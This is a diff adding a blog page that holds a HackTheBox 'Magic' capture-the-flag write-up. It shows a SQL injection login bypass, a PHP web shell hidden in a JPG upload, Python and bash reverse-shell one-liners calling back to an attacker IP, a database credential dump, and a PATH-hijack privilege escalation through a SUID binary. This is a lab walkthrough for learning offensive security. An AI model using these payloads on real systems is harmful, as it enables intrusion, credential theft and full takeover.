@@ -1,0 +1,265 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport" />
+    <meta name="keywords" content="hexo, autumn" />
+    <title>
+        Hexo
+    </title>
+    <!-- favicon -->
+    
+    <link rel="icon" href="https://cdn.jsdelivr.net/gh/frontendsophie/hexo-theme-autumn@1.0.0/source/img/favicon.ico" />
+     
+<link rel="stylesheet" href="/css/style.css">
+
+
+    <!-- highlight -->
+    <link rel="stylesheet" href="https://cdn.bootcss.com/highlight.js/9.12.0/styles/github-gist.min.css" />
+    <script src="//cdn.bootcss.com/highlight.js/9.2.0/highlight.min.js"></script>
+    <script>
+        hljs.initHighlightingOnLoad()
+    </script>
+    <script src="https://cdn.jsdelivr.net/gh/frontendsophie/hexo-infinite-scroll@2.0.0/dist/main.js"></script>
+
+    <script>
+        infiniteScroll()
+
+        window.addEventListener('DOMContentLoaded', function () {
+            const [
+                mainTitle,
+                mobileMenu,
+                mobileMainTitle,
+                mobileMenuBtn,
+                ipadMenuBtn,
+                aside,
+                closeBtn,
+            ] = getEle(
+                '#main-title',
+                '.mobile-menu',
+                '.mobile-menu h3',
+                '.mobile-menu button',
+                '.ipad-menu',
+                'aside',
+                'aside .close',
+            )
+            const io = new IntersectionObserver(entries => {
+                if (entries[0].intersectionRatio <= 0) {
+                    mobileMainTitle.classList.remove('invisibile')
+                } else {
+                    mobileMainTitle.classList.add('invisibile')
+                }
+            })
+            io.observe(mainTitle)
+
+            clickToggleAside(mobileMenuBtn)
+            clickToggleAside(ipadMenuBtn)
+            clickToggleAside(closeBtn, false)
+
+            const isMenuVisible = window.getComputedStyle(mobileMenu).display !== 'none'
+            if (isMenuVisible) document.body.style.background = 'none'
+
+            function getEle(...args) {
+                return args.map(arg => document.querySelector(arg))
+            }
+
+            function clickToggleAside(btn, show = true) {
+                btn.addEventListener('click', function () {
+                    if (show) {
+                        aside.style.display = 'block'
+                    } else {
+                        aside.style.display = 'none'
+                    }
+                })
+            }
+        })
+    </script>
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body style="background: url(https://cdn.jsdelivr.net/gh/frontendsophie/hexo-theme-autumn@1.0.0/source/img/button-bg.png) #f3f3f3">
+    <div class="container">
+        <header class="header">
+    <nav class="mobile-menu" style="background: url(https://cdn.jsdelivr.net/gh/frontendsophie/hexo-theme-autumn@1.0.0/source/img/button-bg.png) #f3f3f3">
+        <h3 class="invisibile">
+            <a href="/" class="logo">
+                Hexo
+            </a>
+        </h3>
+        <button class="menu">menu</button>
+    </nav>
+
+    <button class="ipad-menu menu">menu</button>
+
+    <h1 class="title" id="main-title">
+        <a href="/" class="logo">
+            Hexo
+        </a>
+    </h1>
+    <h2 class="desc">
+        
+    </h2>
+
+    <div class="links">
+        <ul>
+            
+            <li>
+                <a href="https://github.com/FrontendSophie" target="_blank" rel="noopener">
+                    Github
+                </a>
+            </li>
+            
+            <li>
+                <a href="https://www.linkedin.com/in/frontendsophie/" target="_blank" rel="noopener">
+                    LinkedIn
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+</header>
+        <main class="main">
+            <article class="post">
+    
+    
+    <h4 class="post-cat">
+        <a href="/category/Hackthebox/">
+            Hackthebox
+        </a>
+    </h4>
+    
+    
+    <h2 class="post-title">
+        HackTheBox Magic Writeup
+    </h2>
+    <ul class="post-date">
+        <li>
+            2020-04-24
+        </li>
+        <li>
+            M1nzhi
+        </li>
+    </ul>
+    <div class="post-content">
+        <p><img src="/2020/04/24/Hackthebox-Magic-Writeup/0.png" alt></p>
+<h3 id="Steps-to-do"><a href="#Steps-to-do" class="headerlink" title="Steps to do"></a>Steps to do</h3><ul>
+<li>nmap</li>
+<li>Attempt SqiInject</li>
+<li>upload bypass</li>
+<li>reverse shell</li>
+</ul>
+<h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ nmap -T4 --min-rate=400 -v 10.10.10.185</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-24 08:58 EDT</span><br><span class="line">Initiating Ping Scan at 08:58</span><br><span class="line">Scanning 10.10.10.185 [2 ports]</span><br><span class="line">Completed Ping Scan at 08:58, 0.20s elapsed (1 total hosts)</span><br><span class="line">Initiating Parallel DNS resolution of 1 host. at 08:58</span><br><span class="line">Completed Parallel DNS resolution of 1 host. at 08:58, 0.01s elapsed</span><br><span class="line">Initiating Connect Scan at 08:58</span><br><span class="line">Scanning 10.10.10.185 [1000 ports]</span><br><span class="line">Discovered open port 80/tcp on 10.10.10.185</span><br><span class="line">Discovered open port 22/tcp on 10.10.10.185</span><br><span class="line">Completed Connect Scan at 08:58, 3.38s elapsed (1000 total ports)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.185</span><br><span class="line">Host is up (0.19s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">80/tcp open  http</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="SQLInject"><a href="#SQLInject" class="headerlink" title="SQLInject"></a>SQLInject</h3><p>Attempt Login : <a href="http://10.10.10.185/login.php" target="_blank" rel="noopener">http://10.10.10.185/login.php</a> using weak wordlists</p>
+<p>admin:admin , admin:admin123, admin:admin123456,admin:123456,admin:123,admin:000000</p>
+<p>All failed.</p>
+<p>Attempt SQLinject</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;or &#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure>
+
+<p>Yes,I’m in</p>
+<p><img src="/2020/04/24/Hackthebox-Magic-Writeup/1.png" alt></p>
+<h3 id="upload-by-pass"><a href="#upload-by-pass" class="headerlink" title="upload by pass"></a>upload by pass</h3><p>I’m trying to upload 1.php.png ,  But alert “what are you tring to do there”</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> system($_GET[pass]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/04/24/Hackthebox-Magic-Writeup/2.png" alt></p>
+<p>And I realized that It checked the content type of file.So I do some change of  content</p>
+<p><code>Gif8a &lt;?php system($_GET[pass]);?&gt;</code></p>
+<p>And  it doesn’t work too. </p>
+<p>I pay my last hope on mixxing .php and .jpg</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">copy 1.jpg&#x2F;b+1.php&#x2F;a 1.jpg  (windows command)</span><br><span class="line">rename 1.jpg to 1.php.jpg</span><br></pre></td></tr></table></figure>
+
+<p>and it worked</p>
+<p><img src="/2020/04/24/Hackthebox-Magic-Writeup/3.png" alt></p>
+<p>I found the image path: /images/uploads/</p>
+<p>I’m trying to visit : <a href="http://10.10.10.185/images/uploads/a.php.jpg?cmd=ls" target="_blank" rel="noopener">http://10.10.10.185/images/uploads/a.php.jpg?cmd=ls</a></p>
+<p><img src="/2020/04/24/Hackthebox-Magic-Writeup/4.png" alt></p>
+<p>Obviously, upload bypass successful</p>
+<h3 id="reverse-shell"><a href="#reverse-shell" class="headerlink" title="reverse shell"></a>reverse shell</h3><h4 id="bash-tcp"><a href="#bash-tcp" class="headerlink" title="bash tcp"></a>bash tcp</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/10.10.14.5/2333 0&gt;&amp;1   Failed</span><br></pre></td></tr></table></figure>
+
+<h4 id="python"><a href="#python" class="headerlink" title="python"></a>python</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("10.10.14.5"),int(os.getenv("2333"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'</span></span><br></pre></td></tr></table></figure>
+
+<p>Failed</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.5",2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'</span></span><br></pre></td></tr></table></figure>
+
+<p>Failed</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.5",2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'</span></span><br></pre></td></tr></table></figure>
+
+<p>Success</p>
+<p><img src="/2020/04/24/Hackthebox-Magic-Writeup/5.png" alt></p>
+<h3 id="Got-User"><a href="#Got-User" class="headerlink" title="Got User"></a>Got User</h3><p>I found a db.php5 </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">www-data@ubuntu:/<span class="keyword">var</span>/www/Magic$ cat db.php5</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Database</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> $dbName = <span class="string">'Magic'</span> ;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> $dbHost = <span class="string">'localhost'</span> ;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> $dbUsername = <span class="string">'theseus'</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> $dbUserPassword = <span class="string">'iamkingtheseus'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> $cont  = <span class="keyword">null</span>;</span><br></pre></td></tr></table></figure>
+
+<p>su theseus</p>
+<p>oops this is not right password.</p>
+<p><img src="/2020/04/24/Hackthebox-Magic-Writeup/6.png" alt></p>
+<p>i found mysqldump </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mysqldump -utheseus -piamkingtheseus Magic</span><br><span class="line">--</span><br><span class="line">-- Dumping data for table &#96;login&#96;</span><br><span class="line">--</span><br><span class="line"></span><br><span class="line">LOCK TABLES &#96;login&#96; WRITE;</span><br><span class="line">&#x2F;*!40000 ALTER TABLE &#96;login&#96; DISABLE KEYS *&#x2F;;</span><br><span class="line">INSERT INTO &#96;login&#96; VALUES (1,&#39;admin&#39;,&#39;Th3s3usW4sK1ng&#39;);</span><br><span class="line">&#x2F;*!40000 ALTER TABLE &#96;login&#96; ENABLE KEYS *&#x2F;;</span><br><span class="line">UNLOCK TABLES;</span><br><span class="line">&#x2F;*!40103 SET TIME_ZONE&#x3D;@OLD_TIME_ZONE *&#x2F;;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su theseus</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/04/24/Hackthebox-Magic-Writeup/7.png" alt></p>
+<p>cat /Desktop/user.txt to get user hash flag</p>
+<h3 id="elvevation-of-privilege"><a href="#elvevation-of-privilege" class="headerlink" title="elvevation of privilege"></a>elvevation of privilege</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">/bin/umount</span><br><span class="line">/bin/fusermount</span><br><span class="line">/bin/sysinfo</span><br><span class="line">/bin/mount</span><br><span class="line">/bin/su</span><br><span class="line">/bin/ping</span><br></pre></td></tr></table></figure>
+
+<p>sysinfo , It means I can create a fake lshw, and run sysinfo to spark.</p>
+<p>Lshw is called when sysinfo is running.</p>
+<p>create lshw on kali</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.14.5&quot;,4333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure>
+
+<p>on target</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;tmp</span><br><span class="line">mkdir privilege</span><br><span class="line">wget 10.10.14.5:8000&#x2F;lshw     from kali python -m SimpleHTTPServer</span><br><span class="line">chmod 775 lshw</span><br><span class="line">export PATH&#x3D;&#x2F;tmp&#x2F;privilege:$PATH</span><br></pre></td></tr></table></figure>
+
+<p>on kali</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 4333</span><br></pre></td></tr></table></figure>
+
+<p>on target </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sysinfo</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/04/24/Hackthebox-Magic-Writeup/9.png" alt></p>
+<h3 id="summary"><a href="#summary" class="headerlink" title="summary"></a>summary</h3><h4 id="SQLinject"><a href="#SQLinject" class="headerlink" title="SQLinject"></a>SQLinject</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#39;or &#39;1&#39;&#x3D;&#39;1</span><br><span class="line">&quot;or &quot;1&quot;&#x3D;&quot;1</span><br><span class="line">&quot;) or &quot;1&quot;&#x3D;&quot;1</span><br><span class="line">&#39;) or &#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure>
+
+<h4 id="upload-bypass"><a href="#upload-bypass" class="headerlink" title="upload bypass"></a>upload bypass</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">check file type by content .</span><br><span class="line">copy 1.jpg&#x2F;b+1.php&#x2F;a 1.jpg</span><br><span class="line">rename 1.jpg 1.php.jpg</span><br><span class="line">shell: 1.php.jpg?cmd&#x3D;ls</span><br></pre></td></tr></table></figure>
+
+<h4 id="found-db-config"><a href="#found-db-config" class="headerlink" title="found db config"></a>found db config</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqldump -u -p dbname</span><br></pre></td></tr></table></figure>
+
+<h4 id="Switch-user"><a href="#Switch-user" class="headerlink" title="Switch user"></a>Switch user</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su theseus</span><br><span class="line">password</span><br></pre></td></tr></table></figure>
+
+<h4 id="elevation-of-privilege"><a href="#elevation-of-privilege" class="headerlink" title="elevation of privilege"></a>elevation of privilege</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</span><br><span class="line">sysinfo</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;tmp&#x2F;privilege&#x2F;lshw</span><br><span class="line">export PATH&#x3D;&#x2F;tmp&#x2F;privilege:$PATH</span><br><span class="line">chmod 775 &#x2F;tmp&#x2F;privilege&#x2F;lshw</span><br><span class="line">sysinfo</span><br></pre></td></tr></table></figure>
+
+<p>Thanks <a href="https://www.hackthebox.eu/home/users/profile/31190" target="_blank" rel="noopener">@TRX</a></p>
+
+    </div>
+</article>
+        </main>
+        <aside class="aside">
+            <div class="close"></div>
+            <section class="aside-section">
+                
+    <h1>Categories</h1>
+
+    <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/category/Hackthebox/">Hackthebox</a></li><li class="category-list-item"><a class="category-list-link" href="/category/%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5/">安全运营</a></li><li class="category-list-item"><a class="category-list-link" href="/category/%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/">应用安全</a></li></ul>
+
+            </section>
+            <section class="aside-section">
+                
+    <h1>Archives</h1>
+
+    <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/">2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/">2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/">2019</a></li></ul>
+
+
+            </section>
+            <section class="aside-section tag">
+                
+    <h1>Tags</h1>
+
+    <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5-%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/" rel="tag">-安全运营 -安全建设</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF-Challenge/" rel="tag">CTF Challenge</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/HackTheBox/" rel="tag">HackTheBox</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/HackThebox/" rel="tag">HackThebox</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Hackthebox/" rel="tag">Hackthebox</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">PHP代码审计</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SDL/" rel="tag">SDL</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" rel="tag">应急响应</a></li></ul>
+
+            </section>
+        </aside>
+    </div>
+</body>
+
+</html>
